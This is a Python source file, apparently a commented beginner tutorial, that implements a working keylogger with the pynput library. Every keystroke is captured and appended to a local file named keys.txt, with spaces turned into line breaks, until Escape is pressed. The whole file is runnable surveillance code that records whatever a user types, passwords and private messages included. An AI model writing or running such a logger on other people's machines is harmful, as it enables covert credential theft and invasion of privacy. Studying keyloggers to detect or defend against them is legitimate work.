from pynput.keyboard import Listener, Key

# creating a keys and count array
keys = []
count = 0


#
def on_press(key):
    # declaring these two variables as global
    global keys, count

    # appending each key pressed in this keys array ex format -> ['s','s','s'] <- when you type sss 3 times in keyboard
    keys.append(key)
    # print(keys)
    count += 1  # we are incrementing the value of count

    # and we are validating that if the user types 10 or more characters then we are reseting the value of count and running the write() method which makes the array more readable by filtering it
    # and then clearing the keys array
    if count >= 10:
        count = 0
        write(keys)
        keys = []


# this function takes keys array in parameter
def write(keysarray):
    # here we are opening keys.txt file as f
    with open("keys.txt", "a") as f:
        # and we are looping through the keys array
        for key in keysarray:
            # so by default each key will 's' <- like this with " ' " so we have to replace this as no space to make it a word
            key1 = str(key).replace("'", "")

            # if the user presses space key then we are writing a new line in the file for ex-  if i type "i am a good boy" then in the file it should be

            # i
            # am
            # a
            # good
            # boy

            if key1.find("space") > 0:
                f.write("\n")

            # here if this cannot find the string it will return -1
            elif key1.find("Key") == -1:
                # if it cannot find it then it will write the character that is key
                f.write(key1)

# here if the user presses the escape key this keylogger will close


def on_release(key):
    if key == Key.esc:
        return False


# the listener has two parameters one which runs when a key is pressed on the keyboard and another parameter which runs when a key is released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
